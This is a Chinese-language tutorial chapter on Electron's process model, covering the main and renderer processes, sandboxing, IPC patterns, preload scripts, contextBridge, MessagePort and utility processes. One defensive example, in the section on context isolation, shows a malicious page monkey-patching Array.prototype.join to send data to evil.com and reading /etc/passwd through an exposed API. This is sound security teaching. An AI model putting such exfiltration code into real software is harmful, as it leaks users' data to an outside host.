# 第三章：进程模型深入

## 目录

- [Chromium 多进程架构在 Electron 中的体现](#chromium-多进程架构在-electron-中的体现)
- [主进程：应用的"大脑"](#主进程应用的大脑)
- [渲染进程：每个窗口一个"世界"](#渲染进程每个窗口一个世界)
- [渲染进程沙箱机制](#渲染进程沙箱机制)
- [IPC 三种模式详解](#ipc-三种模式详解)
- [preload 脚本：执行时机和作用域](#preload-脚本执行时机和作用域)
- [contextBridge 安全模型](#contextbridge-安全模型)
- [MessagePort 高级用法](#messageport-高级用法)
- [Utility 进程](#utility-进程)
- [深入理解](#深入理解)
- [常见问题](#常见问题)
- [实践建议](#实践建议)

---

## Chromium 多进程架构在 Electron 中的体现

### Chromium 的原始多进程模型

在理解 Electron 之前，先看 Chromium 浏览器本身的进程模型：

```
Chromium 浏览器的进程架构：

┌─────────────────────────────────────────────────────────────┐
│                   Browser Process (浏览器进程)               │
│                                                              │
│  ┌───────────────┐ ┌──────────────┐ ┌───────────────────┐  │
│  │ UI Thread     │ │ IO Thread    │ │ Storage Thread    │  │
│  │ (地址栏/标签) │ │ (网络请求)   │ │ (数据库/Cookie)   │  │
│  └───────────────┘ └──────────────┘ └───────────────────┘  │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │         RenderProcessHost (管理渲染进程)             │    │
│  └─────────────────────────────────────────────────────┘    │
└──────────┬────────────┬────────────┬────────────────────────┘
           │ IPC/Mojo   │ IPC/Mojo   │ IPC/Mojo
           ▼            ▼            ▼
┌──────────────┐ ┌──────────────┐ ┌──────────────┐
│ Renderer #1  │ │ Renderer #2  │ │ Renderer #3  │
│ (Tab 1)      │ │ (Tab 2)      │ │ (Tab 3)      │
│ Blink + V8   │ │ Blink + V8   │ │ Blink + V8   │
└──────────────┘ └──────────────┘ └──────────────┘
           │
           ▼
┌──────────────┐ ┌──────────────┐
│ GPU Process  │ │ Network      │
│ (图形合成)   │ │ Service      │
└──────────────┘ └──────────────┘
```

### Electron 如何复用这个架构

Electron 做了一个关键改造：**Browser Process = Main Process + Node.js**。

```
Electron 的进程架构：

┌─────────────────────────────────────────────────────────────┐
│            Main Process (主进程 = 改造后的 Browser Process)   │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Node.js Runtime (完整)                  │    │
│  │  require('fs') ✓  require('child_process') ✓        │    │
│  │  require('net') ✓  npm packages ✓                   │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Electron API Layer                       │    │
│  │  app | BrowserWindow | Menu | dialog | Tray | ...   │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │         Chromium Browser 核心（窗口/进程管理）       │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────┬─────────────┬──────────────┬──────────────────────┘
          │ IPC          │ IPC           │ IPC
          ▼              ▼               ▼
   ┌────────────┐  ┌────────────┐  ┌────────────────┐
   │ Renderer 1 │  │ Renderer 2 │  │ Utility Process│
   │ (Window 1) │  │ (Window 2) │  │ (可选)         │
   │            │  │            │  │                │
   │ preload.js │  │ preload.js │  │ Node.js        │
   │ Blink + V8 │  │ Blink + V8 │  │ worker task    │
   └────────────┘  └────────────┘  └────────────────┘
```

核心区别总结：

| 概念 | Chromium | Electron |
|------|----------|----------|
| Browser Process | 浏览器 UI + 进程管理 | **Main Process** + Node.js |
| Renderer Process | 网页标签 | **BrowserWindow** 的页面 |
| 扩展进程 | Chrome Extensions | 不支持 |
| Service Workers | 完整支持 | 有限支持 |
| Utility Process | 网络/音频等服务 | 可自定义 |

---

## 主进程：应用的"大脑"

### 单例本质

Electron 应用**有且只有一个主进程**。它是通过执行 `package.json` 中 `main` 字段指定的脚本启动的。

```
为什么是单例？

  操作系统启动应用
        │
        ▼
  创建一个进程，执行 Electron 二进制
        │
        ▼
  Electron 读取 package.json → main.js
        │
        ▼
  在这个进程中执行 main.js
        │
  这个进程 = 主进程（唯一的一个）
        │
        ├─→ 创建 BrowserWindow #1 → 渲染进程 #1
        ├─→ 创建 BrowserWindow #2 → 渲染进程 #2  
        └─→ 创建 UtilityProcess  → 实用进程 #1
```

### 主进程的职责

```javascript
// 主进程能做、也应该做的事：

// 1. 应用生命周期管理
const { app } = require('electron')
app.whenReady()
app.on('before-quit', saveUserData)

// 2. 窗口创建和管理
const { BrowserWindow } = require('electron')
const win = new BrowserWindow({ /* ... */ })

// 3. 系统 API 调用
const { Menu, Tray, dialog, Notification } = require('electron')

// 4. IPC 消息处理
const { ipcMain } = require('electron')
ipcMain.handle('do-something', handler)

// 5. 文件系统操作
const fs = require('node:fs')
fs.readFileSync(path)

// 6. 数据库操作
const Database = require('better-sqlite3')
const db = new Database('app.db')

// 7. 网络请求
const result = await fetch('https://api.example.com/data')

// 8. 子进程
const { spawn } = require('node:child_process')
spawn('ffmpeg', ['-i', input, output])
```

### 主进程中的线程

虽然主进程只有一个 JS 执行线程（V8 是单线程的），但底层有多个原生线程：

```
主进程内部的线程模型：

  ┌──────────────────────────────────────────────┐
  │              Main Process (PID: 1000)         │
  │                                               │
  │  ┌─────────────────────────────────────────┐ │
  │  │  JS 线程 (V8)                           │ │
  │  │  - 你写的所有 JS 代码在这里执行         │ │
  │  │  - 事件循环 (event loop) 在这里转       │ │
  │  │  - 阻塞这里 = 整个应用卡死             │ │
  │  └─────────────────────────────────────────┘ │
  │                                               │
  │  ┌───────────┐ ┌───────────┐ ┌────────────┐ │
  │  │ IO Thread │ │ IPC Thread│ │ Worker Pool│ │
  │  │ (网络)    │ │ (进程通信)│ │ (libuv)    │ │
  │  └───────────┘ └───────────┘ └────────────┘ │
  └──────────────────────────────────────────────┘

  关键认知：
  - 耗时操作用 async/await 或 Worker Threads
  - 永远不要在 JS 线程做同步的重计算
  - fs.readFileSync 对小文件 OK，大文件用 fs.readFile
```

---

## 渲染进程：每个窗口一个"世界"

### 渲染进程的本质

每个 `BrowserWindow` 对应一个独立的渲染进程。这个进程就是一个精简版的 Chrome 标签页。

```javascript
// 创建两个窗口 = 两个独立进程
const win1 = new BrowserWindow({ /* ... */ })  // → PID: 2001
const win2 = new BrowserWindow({ /* ... */ })  // → PID: 2002

// 它们之间：
// - 内存完全隔离
// - JS 上下文完全隔离
// - 不能直接调用对方的函数
// - 只能通过主进程中转通信
```

### 渲染进程能访问什么

```
渲染进程的能力范围：

  ✅ Web 标准 API:
     DOM, CSSOM, Canvas, WebGL, WebAudio,
     fetch, WebSocket, IndexedDB, localStorage,
     Web Workers, Service Workers, WebRTC,
     Intersection Observer, Resize Observer...

  ✅ 通过 preload + contextBridge 暴露的 API:
     window.electronAPI.xxx()

  ❌ Node.js API (默认):
     require, fs, path, child_process...

  ❌ Electron 主进程 API:
     app, BrowserWindow, Menu, dialog...

  ⚠️ Electron 渲染进程 API (通过 preload):
     ipcRenderer, contextBridge, webFrame
```

---

## 渲染进程沙箱机制

### 什么是沙箱

沙箱（Sandbox）是一种安全机制，限制进程能做的事情。Chromium 的渲染进程沙箱从操作系统层面限制进程权限：

```
沙箱限制了什么：

  ┌──────────────────────────────────────────┐
  │          没有沙箱的进程                    │
  │                                           │
  │  可以: 读写任何文件                       │
  │  可以: 访问网络                           │
  │  可以: 创建子进程                         │
  │  可以: 访问硬件设备                       │
  │  可以: 调用系统 API                       │
  └──────────────────────────────────────────┘

  ┌──────────────────────────────────────────┐
  │          有沙箱的渲染进程                  │
  │                                           │
  │  不能: 直接读写文件系统                   │
  │  不能: 创建子进程                         │
  │  不能: 访问硬件设备                       │
  │  不能: 执行系统调用                       │
  │  只能: 通过 IPC 请求主进程代劳            │
  └──────────────────────────────────────────┘
```

### Electron 的沙箱配置

```javascript
// Electron 28+ 默认对所有渲染进程启用沙箱
const win = new BrowserWindow({
  webPreferences: {
    sandbox: true,  // 默认值，明确写出更好
  }
})

// 沙箱模式下的 preload 脚本限制：
// ✅ 可以用: contextBridge, ipcRenderer
// ✅ 可以用: 基本 Node.js 全局对象 (Buffer, process.versions 等)
// ❌ 不能用: require() 加载 Node 模块
// ❌ 不能用: fs, path, child_process 等
```

### 沙箱下的 preload 脚本

沙箱模式下，preload 不能使用 `require()`（除了 electron 模块）。这是有意为之的安全设计：

```javascript
// preload.js (sandbox: true)

// ✅ 可以 require electron 模块
const { contextBridge, ipcRenderer } = require('electron')

// ❌ 不能 require Node.js 模块
// const fs = require('fs')  // Error!
// const path = require('path')  // Error!

// ✅ 可以使用部分 Node.js 全局对象
console.log(process.versions.electron)  // OK
console.log(Buffer.from('hello'))       // OK

// ❌ 但不能使用 process 的其他属性
// console.log(process.env)  // 受限
// process.exit()            // 不可用
```

---

## IPC 三种模式详解

IPC (Inter-Process Communication) 是 Electron 中最核心的概念之一。它是进程间通信的唯一正确方式。

### 模式概览

```
三种 IPC 模式：

模式 1: invoke/handle (请求-响应，推荐)
┌──────────┐  invoke('channel', data)  ┌──────────┐
│ Renderer │ ─────────────────────────→│   Main   │
│          │ ←─────────────────────────│          │
└──────────┘  return result (Promise)  └──────────┘

模式 2: send/on (单向，渲染→主)
┌──────────┐  send('channel', data)    ┌──────────┐
│ Renderer │ ─────────────────────────→│   Main   │
│          │                           │          │
└──────────┘  (没有返回值)             └──────────┘

模式 3: webContents.send (单向，主→渲染)
┌──────────┐  on('channel', callback)  ┌──────────┐
│ Renderer │ ←─────────────────────────│   Main   │
│          │  webContents.send(...)     │          │
└──────────┘                           └──────────┘
```

### 模式 1：invoke/handle（请求-响应）

这是最推荐的模式，类似于 HTTP 的请求/响应。渲染进程发起请求，主进程处理并返回结果。

```javascript
// ═══════════════════════════════════════════
// 主进程 (main.js) — 注册处理器
// ═══════════════════════════════════════════
const { ipcMain } = require('electron')

// handle 注册一个异步处理器
// 第一个参数是 channel 名（字符串，类似 API 路由）
// 第二个参数是处理函数，接收 event 和渲染进程传来的参数
ipcMain.handle('read-file', async (event, filePath) => {
  // event.sender 是触发这个 IPC 的 webContents 对象
  // 可以用来验证请求来源
  console.log('请求来自窗口:', event.sender.id)
  
  try {
    const content = await fs.promises.readFile(filePath, 'utf-8')
    return { success: true, content }
  } catch (err) {
    // 返回的错误会传递给渲染进程
    return { success: false, error: err.message }
  }
})

// 也支持同步返回
ipcMain.handle('get-app-info', () => {
  return {
    version: app.getVersion(),
    platform: process.platform,
    arch: process.arch
  }
})

// ═══════════════════════════════════════════
// preload.js — 暴露安全接口
// ═══════════════════════════════════════════
const { contextBridge, ipcRenderer } = require('electron')

contextBridge.exposeInMainWorld('electronAPI', {
  readFile: (filePath) => ipcRenderer.invoke('read-file', filePath),
  getAppInfo: () => ipcRenderer.invoke('get-app-info'),
})

// ═══════════════════════════════════════════
// 渲染进程 (renderer.js) — 调用
// ═══════════════════════════════════════════

// invoke 返回 Promise，可以 await
async function loadFile(path) {
  const result = await window.electronAPI.readFile(path)
  if (result.success) {
    document.getElementById('content').textContent = result.content
  } else {
    alert('读取失败: ' + result.error)
  }
}

// 获取应用信息
const info = await window.electronAPI.getAppInfo()
console.log(`v${info.version} on ${info.platform}/${info.arch}`)
```

### 模式 2：send/on（渲染 → 主，单向）

用于渲染进程向主进程发送通知，不需要返回值的场景。

```javascript
// ═══════════════════════════════════════════
// 主进程 — 监听消息
// ═══════════════════════════════════════════
const { ipcMain } = require('electron')

ipcMain.on('log-event', (event, eventName, data) => {
  console.log(`[${eventName}]`, data)
  // event.sender 是 webContents 对象
  // event.returnValue 可以设置同步返回值（不推荐）
})

// ═══════════════════════════════════════════
// preload.js
// ═══════════════════════════════════════════
contextBridge.exposeInMainWorld('electronAPI', {
  logEvent: (name, data) => ipcRenderer.send('log-event', name, data),
})

// ═══════════════════════════════════════════
// 渲染进程
// ═══════════════════════════════════════════
// 发送后立即返回，不等待结果
window.electronAPI.logEvent('button-click', { buttonId: 'submit' })
```

### 模式 3：webContents.send（主 → 渲染，推送）

用于主进程主动向渲染进程推送消息，如菜单点击、系统事件、定时更新等。

```javascript
// ═══════════════════════════════════════════
// 主进程 — 推送消息
// ═══════════════════════════════════════════
const { BrowserWindow, Menu } = require('electron')

function createMenuWithSendExample(win) {
  const menu = Menu.buildFromTemplate([
    {
      label: '文件',
      submenu: [
        {
          label: '新建',
          click: () => {
            // 通过 webContents.send 推送到渲染进程
            win.webContents.send('menu-action', 'new-file')
          }
        },
        {
          label: '保存',
          accelerator: 'CmdOrCtrl+S',
          click: () => {
            win.webContents.send('menu-action', 'save-file')
          }
        }
      ]
    }
  ])
  Menu.setApplicationMenu(menu)
}

// 定时推送示例
setInterval(() => {
  const wins = BrowserWindow.getAllWindows()
  wins.forEach(win => {
    win.webContents.send('heartbeat', { timestamp: Date.now() })
  })
}, 60000)

// ═══════════════════════════════════════════
// preload.js
// ═══════════════════════════════════════════
contextBridge.exposeInMainWorld('electronAPI', {
  onMenuAction: (callback) => {
    ipcRenderer.on('menu-action', (event, action) => {
      callback(action)
    })
  },
  onHeartbeat: (callback) => {
    ipcRenderer.on('heartbeat', (event, data) => {
      callback(data)
    })
  },
  // 重要：提供移除监听器的方法，防止内存泄漏
  removeAllListeners: (channel) => {
    ipcRenderer.removeAllListeners(channel)
  }
})

// ═══════════════════════════════════════════
// 渲染进程
// ═══════════════════════════════════════════
window.electronAPI.onMenuAction((action) => {
  switch (action) {
    case 'new-file':
      createNewDocument()
      break
    case 'save-file':
      saveCurrentDocument()
      break
  }
})
```

### IPC 模式选择指南

```
选择哪种 IPC 模式？

  需要返回值吗？
    │
    ├── YES → invoke/handle (模式1)
    │         - 读取数据
    │         - 执行操作并返回结果
    │         - 打开对话框并返回用户选择
    │
    └── NO
         │
         ├── 渲染→主？ → send/on (模式2)
         │               - 日志上报
         │               - 通知事件
         │               - 状态更新
         │
         └── 主→渲染？ → webContents.send (模式3)
                         - 菜单点击通知
                         - 系统事件推送
                         - 定时数据更新
```

### IPC 数据序列化

IPC 传递的数据会被**结构化克隆**（Structured Clone），类似 `JSON.parse(JSON.stringify(data))`，但支持更多类型：

```javascript
// ✅ 可以传递的类型
ipcRenderer.invoke('test', {
  string: 'hello',
  number: 42,
  boolean: true,
  null: null,
  array: [1, 2, 3],
  object: { nested: true },
  date: new Date(),
  regexp: /pattern/g,
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  buffer: Buffer.from('data'),
  arrayBuffer: new ArrayBuffer(8),
  typedArray: new Uint8Array([1, 2, 3]),
  error: new Error('test'),
})

// ❌ 不能传递的类型
ipcRenderer.invoke('test', {
  function: () => {},          // 函数不能序列化
  symbol: Symbol('test'),      // Symbol 不能序列化
  dom: document.body,          // DOM 节点不能序列化
  weakRef: new WeakRef({}),    // WeakRef 不能序列化
  promise: Promise.resolve(),  // Promise 不能序列化
})
```

---

## preload 脚本：执行时机和作用域

### 执行时机详解

```
BrowserWindow 生命周期中 preload 的位置：

  new BrowserWindow()
       │
       ▼
  启动渲染进程 (OS 进程创建)
       │
       ▼
  初始化 V8 引擎
       │
       ▼
  ┌─────────────────────────────────────────┐
  │  创建 Isolated World                     │
  │  (preload 的独立上下文)                  │
  │                                          │
  │  执行 preload.js                         │  ← HERE
  │  - contextBridge.exposeInMainWorld(...)   │
  │  - 此时 document 可能还不存在            │
  └─────────────────────────────────────────┘
       │
       ▼
  loadFile('index.html') / loadURL(...)
       │
       ▼
  HTML 解析，DOM 构建
       │
       ▼
  DOMContentLoaded 事件
       │
       ▼
  页面 JS 执行
  - window.electronAPI 已可用
       │
       ▼
  load 事件
```

### 作用域隔离

当 `contextIsolation: true` 时（默认），preload 脚本运行在一个**隔离世界**（Isolated World）中：

```
V8 Isolate (渲染进程)
│
├── Main World (网页上下文)
│     │
│     ├── window (网页能看到的)
│     ├── document
│     ├── window.electronAPI (由 contextBridge 暴露)
│     └── 页面 JS 代码在这里运行
│
└── Isolated World (preload 上下文)
      │
      ├── window (不同的 window 对象!)
      ├── document (共享 DOM，但 JS 对象隔离)
      ├── require('electron') (只在这里可用)
      ├── contextBridge
      └── preload.js 代码在这里运行

关键：
- 两个 World 看到的 DOM 是同一个
- 但 JS 对象完全隔离
- Main World 不能访问 Isolated World 的变量
- 只有 contextBridge 可以在两个 World 之间传递数据
```

### 为什么需要这种隔离

```javascript
// 假设没有 contextIsolation：
// preload.js
window.myAPI = {
  readFile: require('fs').readFileSync
}

// 恶意网页可以做：
// 1. 修改 Array.prototype.join 来窃取参数
Array.prototype.join = function() {
  fetch('https://evil.com/steal?data=' + this.toString())
  return originalJoin.apply(this, arguments)
}

// 2. 直接调用暴露的 Node.js API
window.myAPI.readFile('/etc/passwd')

// 有了 contextIsolation：
// - preload 中的 require 对网页不可见
// - 网页不能猴子补丁 preload 使用的原型方法
// - 只有 contextBridge 精确暴露的函数可以被调用
```

---

## contextBridge 安全模型

### contextBridge 的工作原理

`contextBridge.exposeInMainWorld` 在 Main World 和 Isolated World 之间创建一个安全的"通道"：

```
contextBridge 内部工作流：

  Isolated World (preload)         Main World (网页)
  ┌──────────────────────┐        ┌──────────────────────┐
  │                      │        │                      │
  │ contextBridge        │        │                      │
  │ .exposeInMainWorld(  │───────→│ window.electronAPI = │
  │   'electronAPI',     │  安全  │   {                  │
  │   {                  │  复制  │     readFile: fn,     │
  │     readFile: fn,    │        │     getInfo: fn,     │
  │     getInfo: fn,     │        │   }                  │
  │   }                  │        │                      │
  │ )                    │        │ // fn 是代理函数，    │
  │                      │        │ // 不是原始函数引用   │
  └──────────────────────┘        └──────────────────────┘
```

### 暴露的 API 经过了什么处理

contextBridge 不是简单地把引用传过去。它会：

1. **函数包装**：创建代理函数，调用时跨世界传参
2. **参数克隆**：参数经过结构化克隆，不是共享引用
3. **返回值克隆**：返回值也经过克隆
4. **错误包装**：异常信息被安全地传递

```javascript
// preload.js
contextBridge.exposeInMainWorld('api', {
  // 原始值：直接复制
  version: '1.0.0',
  
  // 函数：创建代理
  greet: (name) => `Hello ${name}`,
  
  // 异步函数：代理保持 Promise 语义
  fetchData: async (url) => {
    const res = await fetch(url)
    return res.json()
  },
  
  // 对象：递归处理
  utils: {
    add: (a, b) => a + b,
    sub: (a, b) => a - b,
  }
})

// 网页中使用：
// window.api.version → '1.0.0'
// window.api.greet('World') → 'Hello World'
// await window.api.fetchData('...') → {...}
// window.api.utils.add(1, 2) → 3
```

### contextBridge 的限制

```javascript
// ❌ 不能暴露类的实例（原型链丢失）
class MyClass {
  constructor() { this.value = 42 }
  getValue() { return this.value }
}

contextBridge.exposeInMainWorld('api', {
  instance: new MyClass()  // getValue 方法会丢失！
})

// ✅ 应该暴露纯对象和函数
const instance = new MyClass()
contextBridge.exposeInMainWorld('api', {
  getValue: () => instance.getValue()
})

// ❌ 不能暴露 EventEmitter（on/off 模式需要特殊处理）
// ✅ 应该用回调模式
contextBridge.exposeInMainWorld('api', {
  onUpdate: (callback) => {
    ipcRenderer.on('update', (_, data) => callback(data))
  },
  offUpdate: () => {
    ipcRenderer.removeAllListeners('update')
  }
})
```

---

## MessagePort 高级用法

### 为什么需要 MessagePort

标准 IPC (invoke/handle, send/on) 有一个限制：所有通信都经过主进程中转。对于渲染进程之间的高频通信，这会成为瓶颈：

```
标准方式：渲染进程 A → 主进程 → 渲染进程 B（两次 IPC）

MessagePort：渲染进程 A ←──直连──→ 渲染进程 B（一次通信）
```

### MessagePort 工作原理

MessagePort 基于 Web 标准的 `MessageChannel` API。Electron 扩展了它，使其可以跨进程工作。

```
MessagePort 通信建立流程：

  主进程
  ┌──────────────────────────────────────────┐
  │                                           │
  │  const { port1, port2 } = new MC()       │
  │                                           │
  │  win1.webContents.postMessage(            │
  │    'port', null, [port1])                 │
  │                                           │
  │  win2.webContents.postMessage(            │
  │    'port', null, [port2])                 │
  │                                           │
  └──────────────────────────────────────────┘
         │ port1              │ port2
         ▼                    ▼
  ┌──────────────┐    ┌──────────────┐
  │ Renderer #1  │    │ Renderer #2  │
  │              │    │              │
  │ port1.post   │───→│ port2.onmsg  │
  │ Message()    │←───│ port2.post   │
  │ port1.onmsg  │    │ Message()    │
  └──────────────┘    └──────────────┘
  
  建立后，两个渲染进程直接通信，不再经过主进程
```

### 完整代码示例

```javascript
// ═══════════════════════════════════════════
// 主进程 — 创建并分发 MessagePort
// ═══════════════════════════════════════════
const { BrowserWindow, MessageChannelMain } = require('electron')

function connectWindows(win1, win2) {
  // 创建消息通道，得到一对端口
  const { port1, port2 } = new MessageChannelMain()
  
  // 把端口分别发给两个窗口
  // postMessage 的第三个参数是要传输（transfer）的端口
  win1.webContents.postMessage('init-port', null, [port1])
  win2.webContents.postMessage('init-port', null, [port2])
}

app.whenReady().then(() => {
  const win1 = new BrowserWindow({ /* ... */ })
  const win2 = new BrowserWindow({ /* ... */ })
  
  // 等两个窗口都加载完成
  Promise.all([
    new Promise(r => win1.webContents.once('did-finish-load', r)),
    new Promise(r => win2.webContents.once('did-finish-load', r)),
  ]).then(() => {
    connectWindows(win1, win2)
  })
})

// ═══════════════════════════════════════════
// preload.js — 转发端口到页面
// ═══════════════════════════════════════════
const { ipcRenderer } = require('electron')

ipcRenderer.on('init-port', (event) => {
  // event.ports 包含传输的 MessagePort
  const port = event.ports[0]
  
  // 将端口暴露给页面
  window.postMessage('init-port', '*', [port])
})

// ═══════════════════════════════════════════
// 渲染进程 — 使用端口直接通信
// ═══════════════════════════════════════════
window.addEventListener('message', (event) => {
  if (event.data === 'init-port') {
    const port = event.ports[0]
    
    // 监听来自另一个窗口的消息
    port.onmessage = (e) => {
      console.log('收到消息:', e.data)
    }
    
    // 发送消息给另一个窗口
    port.postMessage({ type: 'hello', from: 'window1' })
    
    // 保存端口引用
    window.peerPort = port
  }
})
```

### MessagePort 适用场景

- **渲染进程间高频数据传输**（如协同编辑的操作同步）
- **主进程与 Utility 进程通信**
- **流式数据传输**（避免 IPC 序列化开销）

---

## Utility 进程

Electron v22+ 引入了 `UtilityProcess`，用于在独立进程中运行 Node.js 代码：

```javascript
// ═══════════════════════════════════════════
// 主进程 — 创建 Utility 进程
// ═══════════════════════════════════════════
const { utilityProcess } = require('electron')

const worker = utilityProcess.fork(
  path.join(__dirname, 'heavy-task.js'),
  [],  // args
  {
    serviceName: 'heavy-computation',
    // env: process.env,  // 可选：环境变量
  }
)

// 与 Utility 进程通信
worker.postMessage({ type: 'start', data: largeDataSet })

worker.on('message', (result) => {
  console.log('计算结果:', result)
})

worker.on('exit', (code) => {
  console.log('Utility 进程退出:', code)
})

// ═══════════════════════════════════════════
// heavy-task.js — Utility 进程代码
// ═══════════════════════════════════════════
process.parentPort.on('message', (e) => {
  const { type, data } = e.data
  
  if (type === 'start') {
    // 执行耗时计算（不会阻塞主进程）
    const result = heavyComputation(data)
    process.parentPort.postMessage({ type: 'result', data: result })
  }
})
```

### Utility 进程 vs Worker Threads

```
何时用 Utility 进程：
- 需要完全独立的进程（崩溃不影响主进程）
- 需要处理原生模块（native addons）
- 长期运行的后台服务

何时用 Worker Threads：
- CPU 密集计算但不需要进程隔离
- 共享内存（SharedArrayBuffer）场景
- 开销更小
```

---

## 深入理解

### 进程间内存隔离的代价

每个进程都有独立的 V8 堆，这意味着：

```
3 个窗口的内存占用：

  主进程:     V8 堆 ~20MB + Chromium ~30MB + Node ~15MB  = ~65MB
  渲染进程1:  V8 堆 ~20MB + Blink ~25MB + 页面 ~15MB    = ~60MB
  渲染进程2:  V8 堆 ~20MB + Blink ~25MB + 页面 ~15MB    = ~60MB
  渲染进程3:  V8 堆 ~20MB + Blink ~25MB + 页面 ~15MB    = ~60MB
  GPU 进程:   ~50MB
  ────────────────────────────────────────────────────────
  总计:       ~295MB

  优化策略：
  1. 减少窗口数量（用标签代替新窗口）
  2. 销毁不可见的窗口，需要时重建
  3. 使用 BrowserView 代替多窗口（共享渲染进程）
```

### IPC 性能考量

```
IPC 性能基准（大致）：

  小消息 (<1KB):     ~0.1ms 延迟
  中等消息 (100KB):  ~1-5ms 延迟
  大消息 (10MB):     ~50-200ms 延迟

  瓶颈：序列化/反序列化 (structured clone)

  优化策略：
  1. 批量发送而非逐条发送
  2. 大数据用 SharedArrayBuffer + MessagePort
  3. 二进制数据用 ArrayBuffer 而非 Base64 字符串
  4. 只传必要数据，不传整个对象
```

---

## 常见问题

### Q1: 为什么我在渲染进程用 require 报错？

因为 `nodeIntegration: false`（默认）。这是正确的安全设置。使用 preload + contextBridge 暴露你需要的 API。

### Q2: 两个渲染进程之间怎么通信？

方式 1（简单）：通过主进程中转
```
Renderer A → ipcRenderer.send → ipcMain.on → webContents.send → Renderer B
```

方式 2（高效）：使用 MessagePort 直连

### Q3: ipcMain.handle 和 ipcMain.on 有什么区别？

- `handle`：配合 `invoke` 使用，支持 async/await，有返回值
- `on`：配合 `send` 使用，没有返回值（单向通知）

### Q4: preload 脚本可以有多个吗？

不可以直接配置多个，但可以在 preload 中 require 其他模块：
```javascript
// preload.js
const fileAPI = require('./preload-parts/file-api')
const networkAPI = require('./preload-parts/network-api')

contextBridge.exposeInMainWorld('electronAPI', {
  ...fileAPI,
  ...networkAPI,
})
```
> 注意：sandbox 模式下不能 require 非 electron 模块。

### Q5: IPC 通信安全吗？会被拦截吗？

IPC 通信在进程之间通过操作系统管道传输，不经过网络。除非有其他进程获得了管道句柄（需要 root 权限），否则是安全的。但要注意验证 IPC 消息的参数，防止注入攻击。

---

## 实践建议

### 1. IPC 设计模式

```javascript
// ✅ 推荐：按功能域组织 channel
ipcMain.handle('file:read', handler)
ipcMain.handle('file:write', handler)
ipcMain.handle('file:delete', handler)
ipcMain.handle('db:query', handler)
ipcMain.handle('db:insert', handler)

// ❌ 不推荐：通用的大杂烩 channel
ipcMain.handle('do-action', (event, { type, ...args }) => {
  switch(type) {
    case 'read-file': ...
    case 'write-file': ...
    case 'query-db': ...
  }
})
```

### 2. preload 安全白名单

```javascript
// ✅ 推荐：每个 API 独立暴露，有明确的类型
contextBridge.exposeInMainWorld('electronAPI', {
  readFile: (path) => ipcRenderer.invoke('file:read', path),
  writeFile: (path, content) => ipcRenderer.invoke('file:write', path, content),
})

// ❌ 危险：直接暴露 ipcRenderer
contextBridge.exposeInMainWorld('ipc', ipcRenderer)  // 千万不要这样做！
```

### 3. 内存泄漏防护

```javascript
// preload.js 中，提供清理监听器的方法
contextBridge.exposeInMainWorld('electronAPI', {
  onUpdate: (callback) => {
    const handler = (_, data) => callback(data)
    ipcRenderer.on('update', handler)
    // 返回清理函数
    return () => ipcRenderer.removeListener('update', handler)
  }
})

// 渲染进程中，组件卸载时清理
const cleanup = window.electronAPI.onUpdate(handleUpdate)
// 组件销毁时
cleanup()
```

### 4. TypeScript 类型安全

```typescript
// types/electron-api.d.ts
interface ElectronAPI {
  readFile: (path: string) => Promise<{ success: boolean; content?: string; error?: string }>
  writeFile: (path: string, content: string) => Promise<{ success: boolean }>
  getAppInfo: () => Promise<{ version: string; platform: string }>
  onUpdate: (callback: (data: UpdateInfo) => void) => () => void
}

declare global {
  interface Window {
    electronAPI: ElectronAPI
  }
}
```

---

## 本章小结

Electron 的进程模型是整个框架的基石：

1. **主进程**是唯一的"大脑"，管理窗口和系统 API
2. **渲染进程**各自独立，运行在沙箱中
3. **IPC** 是进程间通信的唯一正确方式（三种模式各有适用场景）
4. **preload + contextBridge** 是安全桥梁
5. **MessagePort** 提供高效的进程直连
6. **Utility 进程**用于后台计算任务

掌握了进程模型，你就掌握了 Electron 的核心。下一章我们将深入窗口管理。

---

> **上一篇**：[02 - 从零搭建第一个 Electron 应用](./02-first-app.md)  
> **下一篇**：[04 - 窗口管理](./04-window-management.md)
